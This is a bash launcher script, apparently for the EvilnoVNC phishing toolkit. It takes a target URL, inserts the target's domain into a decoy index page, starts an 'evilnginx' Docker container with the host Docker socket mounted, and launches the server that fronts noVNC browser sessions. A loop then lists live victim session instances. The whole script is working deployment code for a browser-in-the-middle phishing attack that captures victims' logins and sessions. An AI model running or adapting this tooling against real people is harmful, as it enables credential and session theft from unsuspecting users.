#!/bin/bash

function banner {
    printf "\e[1;34m                                                     
     _____       _ _          __     ___   _  ____ 
    | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
    |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |    
    | |___ \ V /| | | | | | (_) \ V / | |\  | |___ 
    |_____| \_/ |_|_|_| |_|\___/ \_/  |_| \_|\____|                                                
                                                
    \e[1;32m  ---------------- by @JoelGMSec ft Wanetty --------------\n\e[1;0m
    
    Now you can access the root of your domain.\n\n

    \n\e[1;33mContainers running\e[1;34m: 
    ";
}

#sudo service docker start > /dev/null 2>&1 ; sleep 3 ; fi ; fi
# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m ./start_auto.sh\e[1;34m\$url\n\n"
printf "\e[1;33mExamples:\n"
printf "\e[1;0m./start_auto.sh \e[1;34mhttp://example.com\n"
}

if [[ $# -lt 1 ]] ; then help
if [[ $# -lt 0 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
WEBPAGE=$1


path=$(pwd)
printf "\n\e[1;33m[>]Preparando nginx...\n"
cd Files
cp index.html index_tmp.html
id_image=$(sudo docker images evilnovnc -q)
if [ -z $id_image ]; then
    printf "\e[1;31m[!] Image 'evilnovnc' not found!\n\n"
    exit 1
fi

#Change this if you have another index.html
domain=$(echo "$WEBPAGE" | awk -F/ '{print $3}')
sed -i'' -e "s,_domain_,$domain,g" index_tmp.html
cd ..
sudo docker network create nginx-evil 2> /dev/null
sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:80 -d evilnginx
sudo docker exec -it evilnginx bash -c "cp /data/default.conf /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf"
sudo docker exec -it evilnginx bash -c "nginx -s reload"

sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.html /usr/share/nginx/html/index.html"
sudo docker exec -it evilnginx bash -c "nohup /bin/bash -c '/root/server $path $WEBPAGE &'"
rm ./Files/index_tmp.html
printf "\n\e[1;33m[>]Fin nginx..."


trap 'printf "\n\e[1;33m[>] Wait a moment..." ; sleep 3
sudo docker stop evilnginx > /dev/null 2>&1 &
sudo docker network rm nginx-evil > /dev/null 2>&1 &
printf "\n\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT

while true ; 
do 
    clear; 
    banner; 
    instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); 
    for ins in $(echo $instances); do 
        echo "http://localhost/$ins"; 
    done; 
    sleep 15; 
done

#instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); for ins in $(echo $instances); do sudo docker stop $ins; done '